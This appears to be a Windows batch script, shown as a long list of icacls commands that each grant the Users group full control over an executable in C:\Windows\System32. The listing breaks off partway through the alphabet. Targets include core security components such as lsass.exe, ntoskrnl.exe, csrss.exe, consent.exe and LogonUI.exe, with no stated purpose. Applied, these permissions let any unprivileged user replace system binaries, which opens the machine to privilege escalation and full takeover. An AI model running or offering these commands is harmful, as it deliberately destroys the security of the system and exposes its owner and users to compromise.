icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\InstNT.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynMood.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynReflash.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPEnh.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPEnhService.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynTPHelper.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\SynZMetr.exe /t /Grant Users:F
icacls C:\Windows\System32\DriverStore\FileRepository\synpd.inf_amd64_63b0c35087f20e22\Tutorial.exe /t /Grant Users:F
icacls C:\Windows\System32\F12\IEChooser.exe /t /Grant Users:F
icacls C:\Windows\System32\IME\IMEJP\IMJPDCT.EXE /t /Grant Users:F
icacls C:\Windows\System32\IME\IMEJP\IMJPSET.EXE /t /Grant Users:F
icacls C:\Windows\System32\IME\IMEJP\IMJPUEX.EXE /t /Grant Users:F
icacls C:\Windows\System32\IME\IMEJP\imjpuexc.exe /t /Grant Users:F
icacls C:\Windows\System32\IME\IMETC\IMTCLNWZ.EXE /t /Grant Users:F
icacls C:\Windows\System32\IME\IMETC\IMTCPROP.exe /t /Grant Users:F
icacls C:\Windows\System32\IME\SHARED\IMCCPHR.exe /t /Grant Users:F
icacls C:\Windows\System32\IME\SHARED\ImeBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\IME\SHARED\imecfmui.exe /t /Grant Users:F
icacls C:\Windows\System32\IME\SHARED\IMEPADSV.EXE /t /Grant Users:F
icacls C:\Windows\System32\IME\SHARED\IMESEARCH.EXE /t /Grant Users:F
icacls C:\Windows\System32\IME\SHARED\IMEWDBLD.EXE /t /Grant Users:F
icacls C:\Windows\System32\InputMethod\CHS\ChsIME.exe /t /Grant Users:F
icacls C:\Windows\System32\InputMethod\CHT\ChtIME.exe /t /Grant Users:F
icacls C:\Windows\System32\migwiz\mighost.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\audit.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\AuditShD.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\FirstLogonAnim.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\msoobe.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\oobeldr.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\Setup.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\UserOOBEBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\oobe\windeploy.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\scp.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\sftp.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\ssh-add.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\ssh-agent.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\ssh-keygen.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\ssh-keyscan.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenSSH\ssh.exe /t /Grant Users:F
icacls C:\Windows\System32\PerceptionSimulation\PerceptionSimulationInput.exe /t /Grant Users:F
icacls C:\Windows\System32\PerceptionSimulation\PerceptionSimulationService.exe /t /Grant Users:F
icacls C:\Windows\System32\Speech\SpeechUX\SpeechUXWiz.exe /t /Grant Users:F
icacls C:\Windows\System32\Speech_OneCore\common\SpeechModelDownload.exe /t /Grant Users:F
icacls C:\Windows\System32\Speech_OneCore\common\SpeechRuntime.exe /t /Grant Users:F
icacls C:\Windows\System32\spool\tools\PrintBrm.exe /t /Grant Users:F
icacls C:\Windows\System32\spool\tools\PrintBrmEngine.exe /t /Grant Users:F
icacls C:\Windows\System32\Sysprep\sysprep.exe /t /Grant Users:F
icacls C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe /t /Grant Users:F
icacls C:\Windows\System32\UNP\UNPUXHost.exe /t /Grant Users:F
icacls C:\Windows\System32\UNP\UNPUXLauncher.exe /t /Grant Users:F
icacls C:\Windows\System32\UNP\UpdateNotificationMgr.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\mofcomp.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\scrcons.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\unsecapp.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\wbemtest.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\WinMgmt.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\WMIADAP.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\WmiApSrv.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\WMIC.exe /t /Grant Users:F
icacls C:\Windows\System32\wbem\WmiPrvSE.exe /t /Grant Users:F
icacls C:\Windows\System32\WinBioPlugIns\FaceFodUninstaller.exe /t /Grant Users:F
icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /t /Grant Users:F
icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /t /Grant Users:F
icacls C:\Windows\System32\agentactivationruntimestarter.exe /t /Grant Users:F
icacls C:\Windows\System32\AgentService.exe /t /Grant Users:F
icacls C:\Windows\System32\aitstatic.exe /t /Grant Users:F
icacls C:\Windows\System32\alg.exe /t /Grant Users:F
icacls C:\Windows\System32\AppHostRegistrationVerifier.exe /t /Grant Users:F
icacls C:\Windows\System32\appidcertstorecheck.exe /t /Grant Users:F
icacls C:\Windows\System32\appidpolicyconverter.exe /t /Grant Users:F
icacls C:\Windows\System32\appidtel.exe /t /Grant Users:F
icacls C:\Windows\System32\ApplicationFrameHost.exe /t /Grant Users:F
icacls C:\Windows\System32\ApplySettingsTemplateCatalog.exe /t /Grant Users:F
icacls C:\Windows\System32\ApplyTrustOffline.exe /t /Grant Users:F
icacls C:\Windows\System32\ApproveChildRequest.exe /t /Grant Users:F
icacls C:\Windows\System32\AppVClient.exe /t /Grant Users:F
icacls C:\Windows\System32\AppVDllSurrogate.exe /t /Grant Users:F
icacls C:\Windows\System32\AppVNice.exe /t /Grant Users:F
icacls C:\Windows\System32\AppVShNotify.exe /t /Grant Users:F
icacls C:\Windows\System32\ARP.EXE /t /Grant Users:F
icacls C:\Windows\System32\AssignedAccessGuard.exe /t /Grant Users:F
icacls C:\Windows\System32\at.exe /t /Grant Users:F
icacls C:\Windows\System32\AtBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\attrib.exe /t /Grant Users:F
icacls C:\Windows\System32\audiodg.exe /t /Grant Users:F
icacls C:\Windows\System32\auditpol.exe /t /Grant Users:F
icacls C:\Windows\System32\AuthHost.exe /t /Grant Users:F
icacls C:\Windows\System32\autochk.exe /t /Grant Users:F
icacls C:\Windows\System32\autoconv.exe /t /Grant Users:F
icacls C:\Windows\System32\autofmt.exe /t /Grant Users:F
icacls C:\Windows\System32\AxInstUI.exe /t /Grant Users:F
icacls C:\Windows\System32\baaupdate.exe /t /Grant Users:F
icacls C:\Windows\System32\backgroundTaskHost.exe /t /Grant Users:F
icacls C:\Windows\System32\BackgroundTransferHost.exe /t /Grant Users:F
icacls C:\Windows\System32\bcdboot.exe /t /Grant Users:F
icacls C:\Windows\System32\bcdedit.exe /t /Grant Users:F
icacls C:\Windows\System32\bdechangepin.exe /t /Grant Users:F
icacls C:\Windows\System32\BdeHdCfg.exe /t /Grant Users:F
icacls C:\Windows\System32\BdeUISrv.exe /t /Grant Users:F
icacls C:\Windows\System32\bdeunlock.exe /t /Grant Users:F
icacls C:\Windows\System32\BioIso.exe /t /Grant Users:F
icacls C:\Windows\System32\BitLockerDeviceEncryption.exe /t /Grant Users:F
icacls C:\Windows\System32\BitLockerWizard.exe /t /Grant Users:F
icacls C:\Windows\System32\BitLockerWizardElev.exe /t /Grant Users:F
icacls C:\Windows\System32\bitsadmin.exe /t /Grant Users:F
icacls C:\Windows\System32\bootcfg.exe /t /Grant Users:F
icacls C:\Windows\System32\bootim.exe /t /Grant Users:F
icacls C:\Windows\System32\bootsect.exe /t /Grant Users:F
icacls C:\Windows\System32\bridgeunattend.exe /t /Grant Users:F
icacls C:\Windows\System32\browserexport.exe /t /Grant Users:F
icacls C:\Windows\System32\browser_broker.exe /t /Grant Users:F
icacls C:\Windows\System32\bthudtask.exe /t /Grant Users:F
icacls C:\Windows\System32\ByteCodeGenerator.exe /t /Grant Users:F
icacls C:\Windows\System32\cacls.exe /t /Grant Users:F
icacls C:\Windows\System32\calc.exe /t /Grant Users:F
icacls C:\Windows\System32\CameraSettingsUIHost.exe /t /Grant Users:F
icacls C:\Windows\System32\CastSrv.exe /t /Grant Users:F
icacls C:\Windows\System32\CertEnrollCtrl.exe /t /Grant Users:F
icacls C:\Windows\System32\certreq.exe /t /Grant Users:F
icacls C:\Windows\System32\certutil.exe /t /Grant Users:F
icacls C:\Windows\System32\change.exe /t /Grant Users:F
icacls C:\Windows\System32\changepk.exe /t /Grant Users:F
icacls C:\Windows\System32\charmap.exe /t /Grant Users:F
icacls C:\Windows\System32\CheckNetIsolation.exe /t /Grant Users:F
icacls C:\Windows\System32\chglogon.exe /t /Grant Users:F
icacls C:\Windows\System32\chgport.exe /t /Grant Users:F
icacls C:\Windows\System32\chgusr.exe /t /Grant Users:F
icacls C:\Windows\System32\chkdsk.exe /t /Grant Users:F
icacls C:\Windows\System32\chkntfs.exe /t /Grant Users:F
icacls C:\Windows\System32\choice.exe /t /Grant Users:F
icacls C:\Windows\System32\CIDiag.exe /t /Grant Users:F
icacls C:\Windows\System32\cipher.exe /t /Grant Users:F
icacls C:\Windows\System32\cleanmgr.exe /t /Grant Users:F
icacls C:\Windows\System32\cliconfg.exe /t /Grant Users:F
icacls C:\Windows\System32\clip.exe /t /Grant Users:F
icacls C:\Windows\System32\ClipRenew.exe /t /Grant Users:F
icacls C:\Windows\System32\ClipUp.exe /t /Grant Users:F
icacls C:\Windows\System32\CloudExperienceHostBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\CloudNotifications.exe /t /Grant Users:F
icacls C:\Windows\System32\cmd.exe /t /Grant Users:F
icacls C:\Windows\System32\cmdkey.exe /t /Grant Users:F
icacls C:\Windows\System32\cmdl32.exe /t /Grant Users:F
icacls C:\Windows\System32\cmmon32.exe /t /Grant Users:F
icacls C:\Windows\System32\cmstp.exe /t /Grant Users:F
icacls C:\Windows\System32\cofire.exe /t /Grant Users:F
icacls C:\Windows\System32\colorcpl.exe /t /Grant Users:F
icacls C:\Windows\System32\comp.exe /t /Grant Users:F
icacls C:\Windows\System32\compact.exe /t /Grant Users:F
icacls C:\Windows\System32\CompatTelRunner.exe /t /Grant Users:F
icacls C:\Windows\System32\CompMgmtLauncher.exe /t /Grant Users:F
icacls C:\Windows\System32\CompPkgSrv.exe /t /Grant Users:F
icacls C:\Windows\System32\ComputerDefaults.exe /t /Grant Users:F
icacls C:\Windows\System32\conhost.exe /t /Grant Users:F
icacls C:\Windows\System32\consent.exe /t /Grant Users:F
icacls C:\Windows\System32\control.exe /t /Grant Users:F
icacls C:\Windows\System32\convert.exe /t /Grant Users:F
icacls C:\Windows\System32\convertvhd.exe /t /Grant Users:F
icacls C:\Windows\System32\coredpussvr.exe /t /Grant Users:F
icacls C:\Windows\System32\CredentialEnrollmentManager.exe /t /Grant Users:F
icacls C:\Windows\System32\CredentialUIBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\credwiz.exe /t /Grant Users:F
icacls C:\Windows\System32\cscript.exe /t /Grant Users:F
icacls C:\Windows\System32\csrss.exe /t /Grant Users:F
icacls C:\Windows\System32\ctfmon.exe /t /Grant Users:F
icacls C:\Windows\System32\cttune.exe /t /Grant Users:F
icacls C:\Windows\System32\cttunesvr.exe /t /Grant Users:F
icacls C:\Windows\System32\curl.exe /t /Grant Users:F
icacls C:\Windows\System32\CustomInstallExec.exe /t /Grant Users:F
icacls C:\Windows\System32\CustomModeApp.exe /t /Grant Users:F
icacls C:\Windows\System32\CustomModeAppv2_0.exe /t /Grant Users:F
icacls C:\Windows\System32\CustomShellHost.exe /t /Grant Users:F
icacls C:\Windows\System32\dasHost.exe /t /Grant Users:F
icacls C:\Windows\System32\DataExchangeHost.exe /t /Grant Users:F
icacls C:\Windows\System32\DataStoreCacheDumpTool.exe /t /Grant Users:F
icacls C:\Windows\System32\DataUsageLiveTileTask.exe /t /Grant Users:F
icacls C:\Windows\System32\dccw.exe /t /Grant Users:F
icacls C:\Windows\System32\dcomcnfg.exe /t /Grant Users:F
icacls C:\Windows\System32\ddodiag.exe /t /Grant Users:F
icacls C:\Windows\System32\Defrag.exe /t /Grant Users:F
icacls C:\Windows\System32\deploymentcsphelper.exe /t /Grant Users:F
icacls C:\Windows\System32\desktopimgdownldr.exe /t /Grant Users:F
icacls C:\Windows\System32\DeviceCensus.exe /t /Grant Users:F
icacls C:\Windows\System32\DeviceCredentialDeployment.exe /t /Grant Users:F
icacls C:\Windows\System32\DeviceEject.exe /t /Grant Users:F
icacls C:\Windows\System32\DeviceEnroller.exe /t /Grant Users:F
icacls C:\Windows\System32\DevicePairingWizard.exe /t /Grant Users:F
icacls C:\Windows\System32\DeviceProperties.exe /t /Grant Users:F
icacls C:\Windows\System32\DFDWiz.exe /t /Grant Users:F
icacls C:\Windows\System32\dfrgui.exe /t /Grant Users:F
icacls C:\Windows\System32\dialer.exe /t /Grant Users:F
icacls C:\Windows\System32\difx64.exe /t /Grant Users:F
icacls C:\Windows\System32\directxdatabaseupdater.exe /t /Grant Users:F
icacls C:\Windows\System32\diskpart.exe /t /Grant Users:F
icacls C:\Windows\System32\diskperf.exe /t /Grant Users:F
icacls C:\Windows\System32\diskraid.exe /t /Grant Users:F
icacls C:\Windows\System32\DiskSnapshot.exe /t /Grant Users:F
icacls C:\Windows\System32\Dism.exe /t /Grant Users:F
icacls C:\Windows\System32\dispdiag.exe /t /Grant Users:F
icacls C:\Windows\System32\DisplaySwitch.exe /t /Grant Users:F
icacls C:\Windows\System32\djoin.exe /t /Grant Users:F
icacls C:\Windows\System32\dllhost.exe /t /Grant Users:F
icacls C:\Windows\System32\dllhst3g.exe /t /Grant Users:F
icacls C:\Windows\System32\dmcertinst.exe /t /Grant Users:F
icacls C:\Windows\System32\dmcfghost.exe /t /Grant Users:F
icacls C:\Windows\System32\dmclient.exe /t /Grant Users:F
icacls C:\Windows\System32\DmNotificationBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\DmOmaCpMo.exe /t /Grant Users:F
icacls C:\Windows\System32\dnscacheugc.exe /t /Grant Users:F
icacls C:\Windows\System32\doskey.exe /t /Grant Users:F
icacls C:\Windows\System32\dpapimig.exe /t /Grant Users:F
icacls C:\Windows\System32\DpiScaling.exe /t /Grant Users:F
icacls C:\Windows\System32\dpnsvr.exe /t /Grant Users:F
icacls C:\Windows\System32\DPTopologyApp.exe /t /Grant Users:F
icacls C:\Windows\System32\DPTopologyAppv2_0.exe /t /Grant Users:F
icacls C:\Windows\System32\driverquery.exe /t /Grant Users:F
icacls C:\Windows\System32\drvinst.exe /t /Grant Users:F
icacls C:\Windows\System32\DsmUserTask.exe /t /Grant Users:F
icacls C:\Windows\System32\dsregcmd.exe /t /Grant Users:F
icacls C:\Windows\System32\dstokenclean.exe /t /Grant Users:F
icacls C:\Windows\System32\DTUHandler.exe /t /Grant Users:F
icacls C:\Windows\System32\dusmtask.exe /t /Grant Users:F
icacls C:\Windows\System32\dvdplay.exe /t /Grant Users:F
icacls C:\Windows\System32\dwm.exe /t /Grant Users:F
icacls C:\Windows\System32\DWWIN.EXE /t /Grant Users:F
icacls C:\Windows\System32\dxdiag.exe /t /Grant Users:F
icacls C:\Windows\System32\dxgiadaptercache.exe /t /Grant Users:F
icacls C:\Windows\System32\Dxpserver.exe /t /Grant Users:F
icacls C:\Windows\System32\Eap3Host.exe /t /Grant Users:F
icacls C:\Windows\System32\EaseOfAccessDialog.exe /t /Grant Users:F
icacls C:\Windows\System32\easinvoker.exe /t /Grant Users:F
icacls C:\Windows\System32\EASPolicyManagerBrokerHost.exe /t /Grant Users:F
icacls C:\Windows\System32\EDPCleanup.exe /t /Grant Users:F
icacls C:\Windows\System32\edpnotify.exe /t /Grant Users:F
icacls C:\Windows\System32\EduPrintProv.exe /t /Grant Users:F
icacls C:\Windows\System32\efsui.exe /t /Grant Users:F
icacls C:\Windows\System32\EhStorAuthn.exe /t /Grant Users:F
icacls C:\Windows\System32\EM.exe /t /Grant Users:F
icacls C:\Windows\System32\EoAExperiences.exe /t /Grant Users:F
icacls C:\Windows\System32\esentutl.exe /t /Grant Users:F
icacls C:\Windows\System32\eudcedit.exe /t /Grant Users:F
icacls C:\Windows\System32\eventcreate.exe /t /Grant Users:F
icacls C:\Windows\System32\eventvwr.exe /t /Grant Users:F
icacls C:\Windows\System32\expand.exe /t /Grant Users:F
icacls C:\Windows\System32\extrac32.exe /t /Grant Users:F
icacls C:\Windows\System32\fc.exe /t /Grant Users:F
icacls C:\Windows\System32\fclip.exe /t /Grant Users:F
icacls C:\Windows\System32\fhmanagew.exe /t /Grant Users:F
icacls C:\Windows\System32\FileHistory.exe /t /Grant Users:F
icacls C:\Windows\System32\find.exe /t /Grant Users:F
icacls C:\Windows\System32\findstr.exe /t /Grant Users:F
icacls C:\Windows\System32\finger.exe /t /Grant Users:F
icacls C:\Windows\System32\fixmapi.exe /t /Grant Users:F
icacls C:\Windows\System32\fltMC.exe /t /Grant Users:F
icacls C:\Windows\System32\fodhelper.exe /t /Grant Users:F
icacls C:\Windows\System32\Fondue.exe /t /Grant Users:F
icacls C:\Windows\System32\fontdrvhost.exe /t /Grant Users:F
icacls C:\Windows\System32\fontview.exe /t /Grant Users:F
icacls C:\Windows\System32\forfiles.exe /t /Grant Users:F
icacls C:\Windows\System32\fsavailux.exe /t /Grant Users:F
icacls C:\Windows\System32\FsIso.exe /t /Grant Users:F
icacls C:\Windows\System32\fsquirt.exe /t /Grant Users:F
icacls C:\Windows\System32\fsutil.exe /t /Grant Users:F
icacls C:\Windows\System32\ftp.exe /t /Grant Users:F
icacls C:\Windows\System32\fvenotify.exe /t /Grant Users:F
icacls C:\Windows\System32\fveprompt.exe /t /Grant Users:F
icacls C:\Windows\System32\FXSCOVER.exe /t /Grant Users:F
icacls C:\Windows\System32\FXSSVC.exe /t /Grant Users:F
icacls C:\Windows\System32\FXSUNATD.exe /t /Grant Users:F
icacls C:\Windows\System32\GameBarPresenceWriter.exe /t /Grant Users:F
icacls C:\Windows\System32\GameInputSvc.exe /t /Grant Users:F
icacls C:\Windows\System32\GamePanel.exe /t /Grant Users:F
icacls C:\Windows\System32\GenValObj.exe /t /Grant Users:F
icacls C:\Windows\System32\getmac.exe /t /Grant Users:F
icacls C:\Windows\System32\GfxUIEx.exe /t /Grant Users:F
icacls C:\Windows\System32\Gfxv2_0.exe /t /Grant Users:F
icacls C:\Windows\System32\Gfxv4_0.exe /t /Grant Users:F
icacls C:\Windows\System32\gpresult.exe /t /Grant Users:F
icacls C:\Windows\System32\gpscript.exe /t /Grant Users:F
icacls C:\Windows\System32\gpupdate.exe /t /Grant Users:F
icacls C:\Windows\System32\grpconv.exe /t /Grant Users:F
icacls C:\Windows\System32\hdwwiz.exe /t /Grant Users:F
icacls C:\Windows\System32\help.exe /t /Grant Users:F
icacls C:\Windows\System32\HOSTNAME.EXE /t /Grant Users:F
icacls C:\Windows\System32\hvax64.exe /t /Grant Users:F
icacls C:\Windows\System32\hvix64.exe /t /Grant Users:F
icacls C:\Windows\System32\hvsievaluator.exe /t /Grant Users:F
icacls C:\Windows\System32\icacls.exe /t /Grant Users:F
icacls C:\Windows\System32\IcsEntitlementHost.exe /t /Grant Users:F
icacls C:\Windows\System32\icsunattend.exe /t /Grant Users:F
icacls C:\Windows\System32\ie4uinit.exe /t /Grant Users:F
icacls C:\Windows\System32\ie4ushowIE.exe /t /Grant Users:F
icacls C:\Windows\System32\IESettingSync.exe /t /Grant Users:F
icacls C:\Windows\System32\ieUnatt.exe /t /Grant Users:F
icacls C:\Windows\System32\iexpress.exe /t /Grant Users:F
icacls C:\Windows\System32\igfxCUIService.exe /t /Grant Users:F
icacls C:\Windows\System32\igfxEM.exe /t /Grant Users:F
icacls C:\Windows\System32\igfxext.exe /t /Grant Users:F
icacls C:\Windows\System32\igfxHK.exe /t /Grant Users:F
icacls C:\Windows\System32\igfxTray.exe /t /Grant Users:F
icacls C:\Windows\System32\immersivetpmvscmgrsvr.exe /t /Grant Users:F
icacls C:\Windows\System32\InfDefaultInstall.exe /t /Grant Users:F
icacls C:\Windows\System32\InputSwitchToastHandler.exe /t /Grant Users:F
icacls C:\Windows\System32\IntelWiDiUMS64.exe /t /Grant Users:F
icacls C:\Windows\System32\IntelWiDiVAD64.exe /t /Grant Users:F
icacls C:\Windows\System32\iotstartup.exe /t /Grant Users:F
icacls C:\Windows\System32\ipconfig.exe /t /Grant Users:F
icacls C:\Windows\System32\iscsicli.exe /t /Grant Users:F
icacls C:\Windows\System32\iscsicpl.exe /t /Grant Users:F
icacls C:\Windows\System32\isoburn.exe /t /Grant Users:F
icacls C:\Windows\System32\klist.exe /t /Grant Users:F
icacls C:\Windows\System32\ksetup.exe /t /Grant Users:F
icacls C:\Windows\System32\ktmutil.exe /t /Grant Users:F
icacls C:\Windows\System32\label.exe /t /Grant Users:F
icacls C:\Windows\System32\LanguageComponentsInstallerComHandler.exe /t /Grant Users:F
icacls C:\Windows\System32\LaunchTM.exe /t /Grant Users:F
icacls C:\Windows\System32\LaunchWinApp.exe /t /Grant Users:F
icacls C:\Windows\System32\LegacyNetUXHost.exe /t /Grant Users:F
icacls C:\Windows\System32\LicenseManagerShellext.exe /t /Grant Users:F
icacls C:\Windows\System32\licensingdiag.exe /t /Grant Users:F
icacls C:\Windows\System32\LicensingUI.exe /t /Grant Users:F
icacls C:\Windows\System32\LocationNotificationWindows.exe /t /Grant Users:F
icacls C:\Windows\System32\Locator.exe /t /Grant Users:F
icacls C:\Windows\System32\LockAppHost.exe /t /Grant Users:F
icacls C:\Windows\System32\LockScreenContentServer.exe /t /Grant Users:F
icacls C:\Windows\System32\lodctr.exe /t /Grant Users:F
icacls C:\Windows\System32\logagent.exe /t /Grant Users:F
icacls C:\Windows\System32\logman.exe /t /Grant Users:F
icacls C:\Windows\System32\logoff.exe /t /Grant Users:F
icacls C:\Windows\System32\LogonUI.exe /t /Grant Users:F
icacls C:\Windows\System32\lpkinstall.exe /t /Grant Users:F
icacls C:\Windows\System32\lpksetup.exe /t /Grant Users:F
icacls C:\Windows\System32\lpremove.exe /t /Grant Users:F
icacls C:\Windows\System32\LsaIso.exe /t /Grant Users:F
icacls C:\Windows\System32\lsass.exe /t /Grant Users:F
icacls C:\Windows\System32\Magnify.exe /t /Grant Users:F
icacls C:\Windows\System32\makecab.exe /t /Grant Users:F
icacls C:\Windows\System32\manage-bde.exe /t /Grant Users:F
icacls C:\Windows\System32\mavinject.exe /t /Grant Users:F
icacls C:\Windows\System32\MbaeParserTask.exe /t /Grant Users:F
icacls C:\Windows\System32\mblctr.exe /t /Grant Users:F
icacls C:\Windows\System32\MBR2GPT.EXE /t /Grant Users:F
icacls C:\Windows\System32\mcbuilder.exe /t /Grant Users:F
icacls C:\Windows\System32\MDEServer.exe /t /Grant Users:F
icacls C:\Windows\System32\MDMAgent.exe /t /Grant Users:F
icacls C:\Windows\System32\MDMAppInstaller.exe /t /Grant Users:F
icacls C:\Windows\System32\MdmDiagnosticsTool.exe /t /Grant Users:F
icacls C:\Windows\System32\MdRes.exe /t /Grant Users:F
icacls C:\Windows\System32\MdSched.exe /t /Grant Users:F
icacls C:\Windows\System32\mfpmp.exe /t /Grant Users:F
icacls C:\Windows\System32\Microsoft.Uev.CscUnpinTool.exe /t /Grant Users:F
icacls C:\Windows\System32\Microsoft.Uev.SyncController.exe /t /Grant Users:F
icacls C:\Windows\System32\MicrosoftEdgeBCHost.exe /t /Grant Users:F
icacls C:\Windows\System32\MicrosoftEdgeCP.exe /t /Grant Users:F
icacls C:\Windows\System32\MicrosoftEdgeDevTools.exe /t /Grant Users:F
icacls C:\Windows\System32\MicrosoftEdgeSH.exe /t /Grant Users:F
icacls C:\Windows\System32\mmc.exe /t /Grant Users:F
icacls C:\Windows\System32\mmgaserver.exe /t /Grant Users:F
icacls C:\Windows\System32\mobsync.exe /t /Grant Users:F
icacls C:\Windows\System32\mountvol.exe /t /Grant Users:F
icacls C:\Windows\System32\MoUsoCoreWorker.exe /t /Grant Users:F
icacls C:\Windows\System32\mpnotify.exe /t /Grant Users:F
icacls C:\Windows\System32\MpSigStub.exe /t /Grant Users:F
icacls C:\Windows\System32\MRINFO.EXE /t /Grant Users:F
icacls C:\Windows\System32\MRT.exe /t /Grant Users:F
icacls C:\Windows\System32\MSchedExe.exe /t /Grant Users:F
icacls C:\Windows\System32\msconfig.exe /t /Grant Users:F
icacls C:\Windows\System32\msdt.exe /t /Grant Users:F
icacls C:\Windows\System32\msdtc.exe /t /Grant Users:F
icacls C:\Windows\System32\msfeedssync.exe /t /Grant Users:F
icacls C:\Windows\System32\msg.exe /t /Grant Users:F
icacls C:\Windows\System32\mshta.exe /t /Grant Users:F
icacls C:\Windows\System32\msiexec.exe /t /Grant Users:F
icacls C:\Windows\System32\msinfo32.exe /t /Grant Users:F
icacls C:\Windows\System32\mspaint.exe /t /Grant Users:F
icacls C:\Windows\System32\msra.exe /t /Grant Users:F
icacls C:\Windows\System32\MsSpellCheckingHost.exe /t /Grant Users:F
icacls C:\Windows\System32\mstsc.exe /t /Grant Users:F
icacls C:\Windows\System32\mtstocom.exe /t /Grant Users:F
icacls C:\Windows\System32\MuiUnattend.exe /t /Grant Users:F
icacls C:\Windows\System32\MultiDigiMon.exe /t /Grant Users:F
icacls C:\Windows\System32\MusNotification.exe /t /Grant Users:F
icacls C:\Windows\System32\MusNotificationUx.exe /t /Grant Users:F
icacls C:\Windows\System32\MusNotifyIcon.exe /t /Grant Users:F
icacls C:\Windows\System32\Narrator.exe /t /Grant Users:F
icacls C:\Windows\System32\nbtstat.exe /t /Grant Users:F
icacls C:\Windows\System32\ndadmin.exe /t /Grant Users:F
icacls C:\Windows\System32\NDKPing.exe /t /Grant Users:F
icacls C:\Windows\System32\net.exe /t /Grant Users:F
icacls C:\Windows\System32\net1.exe /t /Grant Users:F
icacls C:\Windows\System32\netbtugc.exe /t /Grant Users:F
icacls C:\Windows\System32\netcfg.exe /t /Grant Users:F
icacls C:\Windows\System32\NetCfgNotifyObjectHost.exe /t /Grant Users:F
icacls C:\Windows\System32\NetEvtFwdr.exe /t /Grant Users:F
icacls C:\Windows\System32\NetHost.exe /t /Grant Users:F
icacls C:\Windows\System32\netiougc.exe /t /Grant Users:F
icacls C:\Windows\System32\Netplwiz.exe /t /Grant Users:F
icacls C:\Windows\System32\netsh.exe /t /Grant Users:F
icacls C:\Windows\System32\NETSTAT.EXE /t /Grant Users:F
icacls C:\Windows\System32\newdev.exe /t /Grant Users:F
icacls C:\Windows\System32\NgcIso.exe /t /Grant Users:F
icacls C:\Windows\System32\nltest.exe /t /Grant Users:F
icacls C:\Windows\System32\notepad.exe /t /Grant Users:F
icacls C:\Windows\System32\nslookup.exe /t /Grant Users:F
icacls C:\Windows\System32\ntoskrnl.exe /t /Grant Users:F
icacls C:\Windows\System32\ntprint.exe /t /Grant Users:F
icacls C:\Windows\System32\odbcad32.exe /t /Grant Users:F
icacls C:\Windows\System32\odbcconf.exe /t /Grant Users:F
icacls C:\Windows\System32\ofdeploy.exe /t /Grant Users:F
icacls C:\Windows\System32\omadmclient.exe /t /Grant Users:F
icacls C:\Windows\System32\omadmprc.exe /t /Grant Users:F
icacls C:\Windows\System32\OOBE-Maintenance.exe /t /Grant Users:F
icacls C:\Windows\System32\openfiles.exe /t /Grant Users:F
icacls C:\Windows\System32\OpenWith.exe /t /Grant Users:F
icacls C:\Windows\System32\OptionalFeatures.exe /t /Grant Users:F
icacls C:\Windows\System32\osk.exe /t /Grant Users:F
icacls C:\Windows\System32\pacjsworker.exe /t /Grant Users:F
icacls C:\Windows\System32\PackagedCWALauncher.exe /t /Grant Users:F
icacls C:\Windows\System32\PackageInspector.exe /t /Grant Users:F
icacls C:\Windows\System32\PasswordOnWakeSettingFlyout.exe /t /Grant Users:F
icacls C:\Windows\System32\PATHPING.EXE /t /Grant Users:F
icacls C:\Windows\System32\pcalua.exe /t /Grant Users:F
icacls C:\Windows\System32\pcaui.exe /t /Grant Users:F
icacls C:\Windows\System32\pcwrun.exe /t /Grant Users:F
icacls C:\Windows\System32\perfmon.exe /t /Grant Users:F
icacls C:\Windows\System32\phoneactivate.exe /t /Grant Users:F
icacls C:\Windows\System32\PickerHost.exe /t /Grant Users:F
icacls C:\Windows\System32\PinEnrollmentBroker.exe /t /Grant Users:F
icacls C:\Windows\System32\PING.EXE /t /Grant Users:F
icacls C:\Windows\System32\PkgMgr.exe /t /Grant Users:F
icacls C:\Windows\System32\PktMon.exe /t /Grant Users:F
icacls C:\Windows\System32\plasrv.exe /t /Grant Users:F
icacls C:\Windows\System32\PnPUnattend.exe /t /Grant Users:F
icacls C:\Windows\System32\pnputil.exe /t /Grant Users:F
icacls C:\Windows\System32\poqexec.exe /t /Grant Users:F
icacls C:\Windows\System32\pospaymentsworker.exe /t /Grant Users:F
